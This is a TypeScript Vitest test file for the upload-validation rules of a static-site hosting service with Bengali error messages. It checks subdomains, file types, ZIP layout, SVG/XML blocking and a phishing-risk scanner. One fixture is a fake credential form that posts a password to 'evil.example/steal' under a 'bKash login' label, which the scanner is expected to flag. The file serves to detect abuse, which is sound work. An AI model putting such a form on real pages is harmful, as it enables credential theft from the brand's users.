import { describe, expect, it } from "vitest";
import {
    buildSiteUrl,
    decodeHtmlBytes,
    fileSizeProblem,
    fileTypeProblem,
    htmlContentProblem,
    isBlockedSiteFile,
    resolveZipLayout,
    scanHtmlForRisks,
    subdomainProblem,
    uploadKind,
} from "./deploymentRules";

const enc = (s: string) => new TextEncoder().encode(s);
const files = (...paths: string[]) => paths.map((path) => ({ path, isDirectory: path.endsWith("/") }));

describe("subdomainProblem", () => {
    it("accepts valid names", () => {
        expect(subdomainProblem("my-site")).toBeNull();
        expect(subdomainProblem("abc")).toBeNull();
    });

    it("explains each kind of invalid name", () => {
        expect(subdomainProblem("")).toMatch(/লিখুন/);
        expect(subdomainProblem("ab")).toMatch(/কমপক্ষে ৩/);
        expect(subdomainProblem("my site")).toMatch(/স্পেস/);
        expect(subdomainProblem("my.site")).toMatch(/ডট/);
        expect(subdomainProblem("-site")).toMatch(/হাইফেন/);
        expect(subdomainProblem("admin")).toMatch(/সংরক্ষিত/);
        expect(subdomainProblem("a".repeat(64))).toMatch(/সর্বোচ্চ ৬৩/);
    });
});

describe("buildSiteUrl", () => {
    it("puts the subdomain after /site on the main domain", () => {
        expect(buildSiteUrl("https://tasm-skill.asf.bd/site", "shop")).toBe("https://tasm-skill.asf.bd/site/shop");
        expect(buildSiteUrl("https://tasm-skill.asf.bd/site/", "shop")).toBe("https://tasm-skill.asf.bd/site/shop");
    });
});

describe("file checks", () => {
    it("detects kind case-insensitively", () => {
        expect(uploadKind("Index.HTML")).toBe("html");
        expect(uploadKind("page.htm")).toBe("html");
        expect(uploadKind("Site.ZIP")).toBe("zip");
        expect(uploadKind("site.rar")).toBeNull();
    });

    it("gives a specific message for other archive formats", () => {
        expect(fileTypeProblem("site.rar")).toMatch(/শুধু \.zip/);
        expect(fileTypeProblem("photo.png")).toMatch(/সাপোর্ট করে না/);
    });

    it("rejects empty and oversized files", () => {
        expect(fileSizeProblem(0)).toMatch(/খালি/);
        expect(fileSizeProblem(51 * 1024 * 1024)).toMatch(/সর্বোচ্চ 50MB/);
        expect(fileSizeProblem(1024)).toBeNull();
    });
});

describe("htmlContentProblem", () => {
    it("accepts a normal page, with or without BOM", () => {
        expect(htmlContentProblem(enc("<!DOCTYPE html><html><body>Hi</body></html>"))).toBeNull();
        expect(htmlContentProblem(enc("﻿<html></html>"))).toBeNull();
    });

    it("accepts UTF-16 pages saved by Notepad and decodes them", () => {
        const text = "<html><body>হ্যালো</body></html>";
        const body = new Uint8Array(text.length * 2);
        for (let i = 0; i < text.length; i++) {
            body[i * 2] = text.charCodeAt(i) & 0xff;
            body[i * 2 + 1] = text.charCodeAt(i) >> 8;
        }
        const bytes = new Uint8Array([0xff, 0xfe, ...body]);
        expect(htmlContentProblem(bytes)).toBeNull();
        expect(decodeHtmlBytes(bytes)).toBe(text);
    });

    it("rejects files that are not HTML", () => {
        expect(htmlContentProblem(enc("PK\u0003\u0004rest"))).toMatch(/ZIP ফাইল/);
        expect(htmlContentProblem(enc("   "))).toMatch(/খালি/);
        expect(htmlContentProblem(enc("just some text"))).toMatch(/কোনো HTML ট্যাগ নেই/);
        expect(htmlContentProblem(new Uint8Array([0x3c, 0x68, 0x00, 0x01]))).toMatch(/বাইনারি/);
    });
});

describe("resolveZipLayout", () => {
    it("uses index.html at the root", () => {
        expect(resolveZipLayout(files("index.html", "style.css"))).toEqual({ layout: { rootPrefix: "", indexPath: "index.html", blockedFiles: [] } });
    });

    it("flattens a single wrapping folder", () => {
        expect(resolveZipLayout(files("my-site/", "my-site/index.html", "my-site/css/a.css"))).toEqual({
            layout: { rootPrefix: "my-site/", indexPath: "index.html", blockedFiles: [] },
        });
    });

    it("accepts Index.HTML from Windows", () => {
        expect(resolveZipLayout(files("Index.HTML", "a.png"))).toEqual({ layout: { rootPrefix: "", indexPath: "Index.HTML", blockedFiles: [] } });
    });

    it("ignores macOS junk", () => {
        expect(resolveZipLayout(files("__MACOSX/site/._index.html", "site/index.html", "site/.DS_Store"))).toEqual({
            layout: { rootPrefix: "site/", indexPath: "index.html", blockedFiles: [] },
        });
    });

    it("uses the only HTML page when there is no index.html", () => {
        expect(resolveZipLayout(files("landing.html", "img/a.png"))).toEqual({ layout: { rootPrefix: "", indexPath: "landing.html", blockedFiles: [] } });
    });

    it("prefers the shallowest index over nested ones", () => {
        expect(resolveZipLayout(files("index.html", "blog/index.html"))).toEqual({ layout: { rootPrefix: "", indexPath: "index.html", blockedFiles: [] } });
    });

    it("explains what is wrong otherwise", () => {
        expect(resolveZipLayout(files())).toEqual({ error: expect.stringMatching(/খালি/) });
        expect(resolveZipLayout(files("a.css", "b.png"))).toEqual({ error: expect.stringMatching(/কোনো \.html ফাইল নেই/) });
        expect(resolveZipLayout(files("a.html", "b.html"))).toEqual({ error: expect.stringMatching(/index\.html করে আবার zip/) });
        expect(resolveZipLayout(files("one/index.html", "two/index.html"))).toEqual({ error: expect.stringMatching(/একাধিক সাইট/) });
    });
});

describe("SVG / XML blocking", () => {
    it("flags script-capable document types", () => {
        expect(isBlockedSiteFile("img/logo.svg")).toBe(true);
        expect(isBlockedSiteFile("a/B.SVG")).toBe(true);
        expect(isBlockedSiteFile("feed.xml")).toBe(true);
        expect(isBlockedSiteFile("page.xhtml")).toBe(true);
        expect(isBlockedSiteFile("logo.png")).toBe(false);
        expect(isBlockedSiteFile("index.html")).toBe(false);
    });

    it("reports blocked files in the ZIP layout", () => {
        expect(resolveZipLayout(files("site/index.html", "site/logo.svg", "site/img/a.png", "other/x.svg"))).toEqual({
            layout: { rootPrefix: "site/", indexPath: "index.html", blockedFiles: ["site/logo.svg"] },
        });
    });
});

describe("scanHtmlForRisks", () => {
    it("ignores ordinary pages", () => {
        expect(scanHtmlForRisks("<html><body><form action='/send'><input type='text'></form></body></html>", "tasm-skill.asf.bd")).toEqual([]);
    });

    it("flags password fields, external form targets and brand look-alikes", () => {
        const html = "<form action='https://evil.example/steal'><input type='password'> bKash login</form>";
        const flags = scanHtmlForRisks(html, "tasm-skill.asf.bd");
        expect(flags.includes("password-field")).toBe(true);
        expect(flags.includes("external-form:evil.example")).toBe(true);
        expect(flags.includes("brand:bkash")).toBe(true);
    });
});
